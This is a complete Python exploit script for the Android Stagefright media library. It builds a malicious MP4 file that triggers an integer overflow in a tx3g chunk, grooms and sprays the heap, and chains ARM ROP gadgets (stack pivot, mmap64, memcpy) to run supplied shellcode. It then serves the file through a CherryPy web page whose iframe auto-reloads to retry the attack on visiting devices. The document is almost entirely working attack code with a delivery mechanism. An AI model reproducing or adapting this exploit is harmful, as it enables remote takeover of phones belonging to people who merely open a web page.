#!/usr/bin/python2

import cherrypy
import os
import pwnlib.asm as asm
import pwnlib.elf as elf
import sys
import struct


with open('shellcode.bin', 'rb') as tmp:
  shellcode = tmp.read()

while len(shellcode) % 4 != 0:
  shellcode += '\x00'

# heap grooming configuration
alloc_size = 0x20
groom_count = 0x4
spray_size = 0x100000
spray_count = 0x10

# address of the buffer we allocate for our shellcode
mmap_address = 0x90000000

# addresses that we need to predict
libc_base = 0xb6ebd000
spray_address = 0xb3000000

# ROP gadget addresses
stack_pivot = None
pop_pc = None
pop_r0_r1_r2_r3_pc = None
pop_r4_r5_r6_r7_pc = None
ldr_lr_bx_lr = None
ldr_lr_bx_lr_stack_pad = 0
mmap64 = None
memcpy = None

def find_arm_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='arm')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 4 == 0:
      gadget_address = address
      if gadget_bytes == e.read(gadget_address, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address, arch='arm')
        break
  return gadget_address

def find_thumb_gadget(e, gadget):
  gadget_bytes = asm.asm(gadget, arch='thumb')
  gadget_address = None
  for address in e.search(gadget_bytes):
    if address % 2 == 0:
      gadget_address = address + 1
      if gadget_bytes == e.read(gadget_address - 1, len(gadget_bytes)):
        print asm.disasm(gadget_bytes, vma=gadget_address-1, arch='thumb')
        break
  return gadget_address

def find_gadget(e, gadget):
  gadget_address = find_thumb_gadget(e, gadget)
  if gadget_address is not None:
    return gadget_address
  return find_arm_gadget(e, gadget)

def find_rop_gadgets(path):
  global memcpy
  global mmap64
  global stack_pivot
  global pop_pc
  global pop_r0_r1_r2_r3_pc
  global pop_r4_r5_r6_r7_pc
  global ldr_lr_bx_lr
  global ldr_lr_bx_lr_stack_pad

  e = elf.ELF(path)
  e.address = libc_base

  memcpy = e.symbols['memcpy']
  print '[*] memcpy : 0x{:08x}'.format(memcpy)
  mmap64 = e.symbols['mmap64']
  print '[*] mmap64 : 0x{:08x}'.format(mmap64)

  # .text:00013344    ADD             R2, R0, #0x4C
  # .text:00013348    LDMIA           R2, {R4-LR}
  # .text:0001334C    TEQ             SP, #0
  # .text:00013350    TEQNE           LR, #0
  # .text:00013354    BEQ             botch_0
  # .text:00013358    MOV             R0, R1
  # .text:0001335C    TEQ             R0, #0
  # .text:00013360    MOVEQ           R0, #1
  # .text:00013364    BX              LR

  pivot_asm = ''
  pivot_asm += 'add   r2, r0, #0x4c\n'
  pivot_asm += 'ldmia r2, {r4 - lr}\n'
  pivot_asm += 'teq   sp, #0\n'
  pivot_asm += 'teqne lr, #0'
  stack_pivot = find_arm_gadget(e, pivot_asm)
  print '[*] stack_pivot : 0x{:08x}'.format(stack_pivot)

  pop_pc_asm = 'pop {pc}'
  pop_pc = find_gadget(e, pop_pc_asm)
  print '[*] pop_pc : 0x{:08x}'.format(pop_pc)

  pop_r0_r1_r2_r3_pc = find_gadget(e, 'pop {r0, r1, r2, r3, pc}')
  print '[*] pop_r0_r1_r2_r3_pc : 0x{:08x}'.format(pop_r0_r1_r2_r3_pc)

  pop_r4_r5_r6_r7_pc = find_gadget(e, 'pop {r4, r5, r6, r7, pc}')
  print '[*] pop_r4_r5_r6_r7_pc : 0x{:08x}'.format(pop_r4_r5_r6_r7_pc)

  ldr_lr_bx_lr_stack_pad = 0
  for i in range(0, 0x100, 4):
    ldr_lr_bx_lr_asm =  'ldr lr, [sp, #0x{:08x}]\n'.format(i)
    ldr_lr_bx_lr_asm += 'add sp, sp, #0x{:08x}\n'.format(i + 8)
    ldr_lr_bx_lr_asm += 'bx  lr'
    ldr_lr_bx_lr = find_gadget(e, ldr_lr_bx_lr_asm)
    if ldr_lr_bx_lr is not None:
      ldr_lr_bx_lr_stack_pad = i
      break

def pad(size):
  return '#' * size

def pb32(val):
  return struct.pack(">I", val)

def pb64(val):
  return struct.pack(">Q", val)

def p32(val):
  return struct.pack("<I", val)

def p64(val):
  return struct.pack("<Q", val)

def chunk(tag, data, length=0):
  if length == 0:
    length = len(data) + 8
  if length > 0xffffffff:
    return pb32(1) + tag + pb64(length)+ data
  return pb32(length) + tag + data

def alloc_avcc(size):
  avcc = 'A' * size
  return chunk('avcC', avcc)

def alloc_hvcc(size):
  hvcc = 'H' * size
  return chunk('hvcC', hvcc)

def sample_table(data):
  stbl = ''
  stbl += chunk('stco', '\x00' * 8)
  stbl += chunk('stsc', '\x00' * 8)
  stbl += chunk('stsz', '\x00' * 12)
  stbl += chunk('stts', '\x00' * 8)
  stbl += data
  return chunk('stbl', stbl)

def memory_leak(size):
  pssh = 'leak'
  pssh += 'L' * 16
  pssh += pb32(size)
  pssh += 'L' * size
  return chunk('pssh', pssh)

def heap_spray(size):
  pssh = 'spry'
  pssh += 'S' * 16
  pssh += pb32(size)

  page = ''

  nop = asm.asm('nop', arch='thumb')
  while len(page) < 0x100:
    page += nop
  page += shellcode
  while len(page) < 0xed0:
    page += '\xcc'

  # MPEG4DataSource fake vtable
  page += p32(stack_pivot)

  # pivot swaps stack then returns to pop {pc}
  page += p32(pop_r0_r1_r2_r3_pc)

  # mmap64(mmap_address,
  #        0x1000,
  #        PROT_READ | PROT_WRITE | PROT_EXECUTE,
  #        MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS,
  #        -1,
  #        0);

  page += p32(mmap_address)             # r0 = address
  page += p32(0x1000)                   # r1 = size
  page += p32(7)                        # r2 = protection
  page += p32(0x32)                     # r3 = flags
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap64)                   # pc

  page += p32(0xffffffff)               # fd      (and then r4)
  page += pad(4)                        # padding (and then r5)
  page += p64(0)                        # offset  (and then r6, r7)
  page += p32(pop_r0_r1_r2_r3_pc)       # pc

  # memcpy(shellcode_address,
  #        spray_address + len(rop_stack),
  #        len(shellcode));

  page += p32(mmap_address)             # r0 = dst
  page += p32(spray_address - 0xed0)    # r1 = src
  page += p32(0xed0)                    # r2 = size
  page += p32(0x33333333)               # r3
  page += p32(ldr_lr_bx_lr)             # pc

  page += pad(ldr_lr_bx_lr_stack_pad)
  page += p32(pop_r4_r5_r6_r7_pc)       # lr
  page += pad(4)

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(memcpy)                   # pc

  page += p32(0x44444444)               # r4
  page += p32(0x55555555)               # r5
  page += p32(0x66666666)               # r6
  page += p32(0x77777777)               # r7
  page += p32(mmap_address + 1)         # pc

  while len(page) < 0x1000:
    page += '#'

  pssh += page * (size // 0x1000)

  return chunk('pssh', pssh)

def exploit_mp4():
  ftyp = chunk("ftyp","69736f6d0000000169736f6d".decode("hex"))

  trak = ''

  # heap spray so we have somewhere to land our corrupted vtable
  # pointer

  # yes, we wrap this in a sample_table for a reason; the
  # NuCachedSource we will be using otherwise triggers calls to mmap,
  # leaving our large allocations non-contiguous and making our chance
  # of failure pretty high. wrapping in a sample_table means that we
  # wrap the NuCachedSource with an MPEG4Source, making a single
  # allocation that caches all the data, doubling our heap spray
  # effectiveness :-)
  trak += sample_table(heap_spray(spray_size) * spray_count)

  # heap groom for our MPEG4DataSource corruption

  # get the default size allocations for our MetaData::typed_data
  # groom allocations out of the way first, by allocating small blocks
  # instead.
  trak += alloc_avcc(8)
  trak += alloc_hvcc(8)

  # we allocate the initial tx3g chunk here; we'll use the integer
  # overflow so that the allocated buffer later is smaller than the
  # original size of this chunk, then overflow all of the following
  # MPEG4DataSource object and the following pssh allocation; hence why
  # we will need the extra groom allocation (so we don't overwrite
  # anything sensitive...)

  # | tx3g | MPEG4DataSource | pssh |
  overflow = 'A' * 24

  # | tx3g ----------------> | pssh |
  overflow += p32(spray_address)         # MPEG4DataSource vtable ptr
  overflow += '0' * 0x48
  overflow += '0000'                    # r4
  overflow += '0000'                    # r5
  overflow += '0000'                    # r6
  overflow += '0000'                    # r7
  overflow += '0000'                    # r8
  overflow += '0000'                    # r9
  overflow += '0000'                    # r10
  overflow += '0000'                    # r11
  overflow += '0000'                    # r12
  overflow += p32(spray_address + 0x20) # sp
  overflow += p32(pop_pc)               # lr

  trak += chunk("tx3g", overflow)

  # defragment the for alloc_size blocks, then make our two
  # allocations. we end up with a spurious block in the middle, from
  # the temporary ABuffer deallocation.

  # | pssh | - | pssh |
  trak += memory_leak(alloc_size) * groom_count

  # | pssh | - | pssh | .... | avcC |
  trak += alloc_avcc(alloc_size)

  # | pssh | - | pssh | .... | avcC | hvcC |
  trak += alloc_hvcc(alloc_size)

  # | pssh | - | pssh | pssh | avcC | hvcC | pssh |
  trak += memory_leak(alloc_size) * 8

  # | pssh | - | pssh | pssh | avcC | .... |
  trak += alloc_hvcc(alloc_size * 2)

  # entering the stbl chunk triggers allocation of an MPEG4DataSource
  # object

  # | pssh | - | pssh | pssh | avcC | MPEG4DataSource | pssh |
  stbl = ''

  # | pssh | - | pssh | pssh | .... | MPEG4DataSource | pssh |
  stbl += alloc_avcc(alloc_size * 2)

  # | pssh | - | pssh | pssh | tx3g | MPEG4DataSource | pssh |
  # | pssh | - | pssh | pssh | tx3g ----------------> |
  overflow_length = (-(len(overflow) - 24) & 0xffffffffffffffff)
  stbl += chunk("tx3g", '', length = overflow_length)

  trak += chunk('stbl', stbl)

  return ftyp + chunk('trak', trak)

index_page = '''
<!DOCTYPE html>
<html>
  <head>
    <title>Stagefrightened!</title>
  </head>
  <body>
    <script>
    window.setTimeout('location.reload(true);', 4000);
    </script>
    <iframe src='/exploit.mp4'></iframe>
  </body>
</html>
'''

class ExploitServer(object):

  exploit_file = None
  exploit_count = 0

  @cherrypy.expose
  def index(self):
    self.exploit_count += 1
    print '*' * 80
    print 'exploit attempt: ' + str(self.exploit_count)
    print '*' * 80
    return index_page

  @cherrypy.expose(["exploit.mp4"])
  def exploit(self):
    cherrypy.response.headers['Content-Type'] = 'video/mp4'
    cherrypy.response.headers['Content-Encoding'] = 'gzip'

    if self.exploit_file is None:
      exploit_uncompressed = exploit_mp4()
      with open('exploit_uncompressed.mp4', 'wb') as tmp:
        tmp.write(exploit_uncompressed)
      os.system('gzip exploit_uncompressed.mp4')
      with open('exploit_uncompressed.mp4.gz', 'rb') as tmp:
        self.exploit_file = tmp.read()
      os.system('rm exploit_uncompressed.mp4.gz')

    return self.exploit_file

def main():
  find_rop_gadgets('libc.so')
  with open('exploit.mp4', 'wb') as tmp:
    tmp.write(exploit_mp4())
  cherrypy.quickstart(ExploitServer())

if __name__ == '__main__':
  main()